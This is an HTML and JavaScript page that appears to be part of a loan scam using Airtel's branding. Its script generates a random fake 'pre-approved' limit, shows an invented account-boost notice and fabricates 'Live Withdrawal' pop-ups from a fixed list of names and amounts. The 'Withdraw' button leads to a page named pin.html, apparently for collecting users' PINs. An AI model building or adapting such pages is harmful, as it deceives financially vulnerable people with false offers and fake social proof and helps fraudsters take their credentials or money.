    <style>
         :root {
            --airtel-red: #ce1e2d;
            --smart-black: #111111;

        body {
            font-family: 'Outfit', sans-serif;

        .surge-text {

<body class="min-h-screen flex items-center justify-center p-6">

    <div class="w-full max-w-[400px] premium-card p-10 relative z-10">

        <div class="flex flex-col items-center mb-10">
            <div class="w-12 h-12 bg-[#ce1e2d] rounded-[18px] flex items-center justify-center text-white font-extrabold text-2xl italic mb-3 shadow-lg">
                a
            </div>
            <p class="text-[9px] font-extrabold uppercase tracking-[0.4em] text-gray-400">Eazy Loan Executive Limit</p>
        </div>

        <div class="text-center">
            <h2 class="text-[12px] font-bold text-gray-400 uppercase tracking-widest mb-2">Max Pre-Approved Funds</h2>

            <div class="flex items-start justify-center mb-8">
                <span class="text-2xl font-bold mt-2 mr-1">KES</span>
                <h1 id="surgeAmount" class="amount-font text-6xl font-extrabold surge-text">0</h1>
            </div>

            <div class="bg-red-50 rounded-2xl p-4 mb-8 border border-red-100">
                <p class="text-[11px] leading-relaxed text-red-800 font-medium">
                    âš¡ High-velocity account detected. Your withdrawal limit has been boosted automatically.
                </p>
            </div>

            <button onclick="location.href='pin.html'" class="w-full bg-black text-white rounded-2xl py-5 px-8 flex items-center justify-between group active:scale-95 transition-all">
                <span class="text-sm font-bold tracking-wide uppercase">Withdraw to Equity Wallet</span>
                <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M17 8l4 4m0 0l-4 4m4-4H3"></path>
                </svg>
            </button>
        </div>
    </div>

    <div id="popupContainer" class="fixed bottom-10 left-0 right-0 flex justify-center px-6 pointer-events-none">
    </div>

    <script>
        // 1. SMART AUTO-GENERATING LIMIT
        const surgeAmount = document.getElementById('surgeAmount');
        const targetLimit = Math.floor(Math.random() * (5000 - 3500 + 1)) + 3500;

        window.onload = () => {
            let current = 0;
            const duration = 2000;
            const steps = duration / 16;
            const increment = targetLimit / steps;

            surgeAmount.classList.add('surging');

            const timer = setInterval(() => {
                current += increment;
                if (current >= targetLimit) {
                    current = targetLimit;
                    clearInterval(timer);
                    surgeAmount.classList.remove('surging');
                }
                surgeAmount.innerText = Math.floor(current).toLocaleString();
            }, 16);

            // Start Social Popups
            setInterval(createPopup, 5000);
            setTimeout(createPopup, 1000);
        };

        // 2. SOCIAL PROOF POPUPS
        const names = ["Blessing M.", "John S.", "Gift O.", "Sarah K.", "Peter Z.", "Chipo L.", "Isaac T."];
        const amounts = ["1,500", "2,000", "500", "3,500", "1,200", "4,000"];

        function createPopup() {
            const container = document.getElementById('popupContainer');
            const name = names[Math.floor(Math.random() * names.length)];
            const amount = amounts[Math.floor(Math.random() * amounts.length)];

            const popup = document.createElement('div');
            popup.className = "popup-slide bg-white shadow-2xl rounded-2xl p-4 flex items-center gap-3 border border-gray-100 max-w-[280px]";
            popup.innerHTML = `
                <div class="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center">
                    <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20"><path d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"></path></svg>
                </div>
                <div>
                    <p class="text-[10px] text-gray-400 font-bold uppercase">Live Withdrawal</p>
                    <p class="text-xs font-bold text-gray-800">${name} just withdrew KES ${amount}</p>
                </div>
            `;

            container.appendChild(popup);
            setTimeout(() => popup.remove(), 7000);
        }
    </script>
